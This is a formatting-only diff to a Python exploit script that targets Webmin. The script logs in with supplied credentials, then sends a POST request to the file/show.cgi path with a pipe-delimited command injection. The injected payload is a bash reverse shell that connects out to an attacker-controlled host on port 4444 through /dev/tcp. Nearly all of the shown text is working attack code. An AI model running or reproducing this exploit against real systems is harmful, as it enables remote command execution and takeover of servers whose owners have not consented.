@@ -20,6 +20,7 @@ LOCAL_PORT = "4444"
 
 PAYLOAD = f"bash -c 'exec bash -i &>/dev/tcp/{LOCAL_HOST}/{LOCAL_PORT}<&1'"
 
+
 def login(host, port, username, password):
     """
     Log in to the webmin host with a valid set of credentials.
@@ -41,6 +42,7 @@ def login(host, port, username, password):
     print(f"[/] Cookie session: {session}")
     return session
 
+
 def generate_random_string(length):
     """
     Generate a string of random ascii letters and digits of the given length.
@@ -48,13 +50,15 @@ def generate_random_string(length):
     alpha_num = string.ascii_letters + string.digits
     return ''.join(random.choice(alpha_num) for _ in range(length))
 
+
 def exploit(host, port, session, payload):
     """
     Send the exploit payload.
     """
     random_string = generate_random_string(10)
     url = f"http://{host}:{port}/file/show.cgi/bin/{random_string}|{payload}|"
-    requests.post(url, cookies={"sid":session}, timeout=10)
+    requests.post(url, cookies={"sid": session}, timeout=10)
+
 
 def main():
     """
@@ -64,6 +68,7 @@ def main():
     """
     session = login(REMOTE_HOST, REMOTE_PORT, USERNAME, PASSWORD)
     exploit(REMOTE_HOST, REMOTE_PORT, session, PAYLOAD)
+
 
 if __name__ == "__main__":
     main()
